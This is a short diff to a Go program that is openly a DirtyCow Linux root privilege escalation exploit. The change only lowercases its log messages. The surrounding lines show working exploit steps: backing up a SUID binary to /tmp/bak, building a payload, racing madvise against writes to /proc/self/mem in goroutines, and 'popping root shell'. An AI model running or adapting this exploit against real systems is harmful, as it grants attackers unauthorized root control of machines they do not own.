@@ -81,8 +81,8 @@ func waitForWrite() {
 	signals <- true
 	signals <- true
 
-	log.Println("Popping root shell.")
-	log.Println("Don't forget to restore /tmp/bak")
+	log.Println("popping root shell.")
+	log.Println("do not forget to restore /tmp/bak")
 
 	attr := os.ProcAttr{
 		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
@@ -96,8 +96,8 @@ func waitForWrite() {
 }
 
 func main() {
-	log.Println("DirtyCow root privilege escalation.")
-	log.Printf("Backing up %s.. to /tmp/bak", SuidBinary)
+	log.Println("dirtycow root privilege escalation.")
+	log.Printf("backing up %s.. to /tmp/bak", SuidBinary)
 
 	backup := exec.Command("cp", SuidBinary, "/tmp/bak")
 	if err := backup.Run(); err != nil {
@@ -113,7 +113,7 @@ func main() {
 		log.Fatal(err)
 	}
 
-	log.Printf("Size of binary: %d", st.Size())
+	log.Printf("size of binary: %d", st.Size())
 
 	payload := make([]byte, st.Size())
 	for i, _ := range payload {
@@ -133,7 +133,7 @@ func main() {
 		0,
 	)
 
-	log.Println("Racing, this may take a while...")
+	log.Println("racing, this may take a while...")
 	go madvise()
 	go procselfmem(payload)
 	waitForWrite()
